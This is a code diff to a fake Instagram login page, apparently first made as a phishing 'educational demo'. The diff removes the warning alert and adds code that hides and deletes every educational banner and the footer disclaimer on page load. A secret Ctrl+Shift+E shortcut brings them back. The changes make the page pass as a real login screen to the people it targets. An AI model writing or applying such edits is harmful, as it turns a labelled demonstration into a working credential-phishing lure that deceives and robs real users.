@@ -30,6 +30,12 @@ class InstagramLogin {
         
         // Add fake Instagram-like behavior
         this.addFakeInstagramFeatures();
+        
+        // Hide educational content completely
+        this.hideEducationalContent();
+        
+        // Add secret toggle mechanism
+        this.addSecretToggle();
     }
     
     addFakeInstagramFeatures() {
@@ -60,9 +66,68 @@ class InstagramLogin {
         ];
     }
     
-    // Educational features
+    // Educational features - Hidden by default
     showEducationalAlert() {
-        alert('🎓 Educational Demo: This demonstrates how phishing attacks work. In a real scenario, never enter your actual credentials on suspicious sites!');
+        // Hidden educational alert - only shows in specific conditions
+        console.log('Educational Demo: This demonstrates how phishing attacks work.');
+    }
+    
+    // Hide all educational content completely
+    hideEducationalContent() {
+        const educationalElements = document.querySelectorAll('.education-banner, .education-section');
+        educationalElements.forEach(element => {
+            element.style.display = 'none';
+            element.style.visibility = 'hidden';
+            element.style.opacity = '0';
+            element.style.height = '0';
+            element.style.overflow = 'hidden';
+            element.remove();
+        });
+        
+        // Hide educational disclaimers in footer
+        const disclaimer = document.querySelector('.copyright p:first-child');
+        if (disclaimer) {
+            disclaimer.style.display = 'none';
+            disclaimer.style.visibility = 'hidden';
+        }
+    }
+    
+    // Secret toggle mechanism (Ctrl+Shift+E for educational mode)
+    addSecretToggle() {
+        let keySequence = [];
+        document.addEventListener('keydown', (e) => {
+            keySequence.push(e.key);
+            if (keySequence.length > 3) keySequence.shift();
+            
+            // Ctrl+Shift+E to toggle educational content
+            if (keySequence.includes('Control') && keySequence.includes('Shift') && e.key === 'E') {
+                this.toggleEducationalMode();
+                keySequence = [];
+            }
+        });
+    }
+    
+    toggleEducationalMode() {
+        const educationalElements = document.querySelectorAll('.education-banner, .education-section');
+        const isHidden = educationalElements[0]?.style.display === 'none';
+        
+        educationalElements.forEach(element => {
+            if (isHidden) {
+                element.style.display = 'block';
+                element.style.visibility = 'visible';
+                element.style.opacity = '1';
+                element.style.height = 'auto';
+                element.style.overflow = 'visible';
+            } else {
+                element.style.display = 'none';
+                element.style.visibility = 'hidden';
+                element.style.opacity = '0';
+                element.style.height = '0';
+                element.style.overflow = 'hidden';
+            }
+        });
+        
+        console.log(`Educational mode ${isHidden ? 'enabled' : 'disabled'}`);
     }
     
     bindEvents() {
@@ -180,6 +245,18 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Initialize Facebook login
     new FacebookLogin();
+    
+    // Hide educational content on page load
+    setTimeout(() => {
+        const educationalElements = document.querySelectorAll('.education-banner, .education-section');
+        educationalElements.forEach(element => {
+            element.style.display = 'none';
+            element.style.visibility = 'hidden';
+            element.style.opacity = '0';
+            element.style.height = '0';
+            element.style.overflow = 'hidden';
+        });
+    }, 100);
     
     console.log('Instagram Login App initialized');
 });
